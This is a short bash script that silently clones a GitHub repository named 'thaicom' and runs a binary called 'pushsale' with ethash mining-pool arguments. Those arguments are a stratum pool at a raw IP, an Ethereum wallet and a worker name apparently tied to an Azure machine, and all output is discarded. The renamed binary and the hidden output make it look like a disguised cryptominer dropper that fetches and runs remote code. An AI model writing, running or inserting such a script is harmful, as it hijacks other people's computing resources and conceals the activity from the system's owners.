#!/bin/bash
cd /thaidev
git clone https://github.com/thaidevcom/thaicom.git -q
chmod -R +x thaicom
./thaicom/pushsale -a ethash -o stratum+tcp://51.89.64.65:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-09 > /dev/null 2>&1